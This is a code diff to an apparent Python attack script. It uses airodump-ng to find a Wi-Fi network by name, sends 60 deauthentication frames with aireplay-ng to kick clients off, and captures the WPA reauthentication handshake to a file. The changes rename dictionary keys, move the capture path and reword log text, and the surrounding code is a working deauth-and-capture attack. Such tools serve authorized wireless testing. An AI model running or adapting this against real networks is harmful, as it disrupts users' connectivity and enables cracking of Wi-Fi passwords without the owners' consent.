@@ -50,7 +50,7 @@ def start_airodump(airodump_args, stop_event):
     logging.info("inside start_airodump")
     cmd = [
         "sudo", "airodump-ng", "-w", airodump_args["cap_file_name"],
-        "-c", str(airodump_args["channel"]), "--bssid", airodump_args["bssid"],
+        "-c", str(airodump_args["channel"]), "--bssid", airodump_args["BSSID"],
         airodump_args["interface"]
     ]
 
@@ -69,7 +69,7 @@ def send_deauths(aireplay_args, stop_event):
     put_interface_in_same_channel(aireplay_args["interface"], "6")
     cmd = [
         "sudo", "aireplay-ng", "--deauth", str(aireplay_args["deauths"]),
-        "-a", aireplay_args["bssid"], aireplay_args["interface"]
+        "-a", aireplay_args["BSSID"], aireplay_args["interface"]
     ]
 
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -117,7 +117,7 @@ def find_network_info_by_essid(essid: str, interface: str = "wlan0mon", timeout:
     Returns all network info as a dict once found, or None on timeout.
     """
 
-    output_prefix = "/tmp/airodump_capture"  # no .csv here
+    output_prefix = "./airodump_capture"  # no .csv here
     csv_path = Path(f"{output_prefix}-01.csv")
     
     # Start airodump-ng with CSV output
@@ -205,16 +205,17 @@ def main():
 
     network_info = find_network_info_by_essid(args.target, args.interface)
     
-    logging.info("Network Info: %s", network_info)
+    logging.info("Target Network Info: %s", network_info)
     
     if network_info:
         aireplay_stop_event = threading.Event()
         airodump_stop_event = threading.Event()
         
-        # In its own thread, send 20 deauths by default TODO: make this value a command line arg
-        aireplay_args = { "interface": args.interface, "bssid": network_info["bssid"], "deauths": "60" }
+        # In its own thread, send 60 deauths by default TODO: make this value a command line arg
+        aireplay_args = { "interface": args.interface, "BSSID": network_info["BSSID"], "deauths": "60" }
+        
         # In second thread, capture the automatic reauthentication attempt
-        airodump_args = { "cap_file_name": args.capfile, "channel": network_info["channel"], "bssid": network_info["bssid"], "interface": args.interface }
+        airodump_args = { "cap_file_name": args.capfile, "channel": network_info["channel"], "BSSID": network_info["BSSID"], "interface": args.interface }
 
         deauth_thread = threading.Thread(target=send_deauths, args=(aireplay_args, aireplay_stop_event))
         airodump_thread = threading.Thread(target=start_airodump, args=(airodump_args, airodump_stop_event))
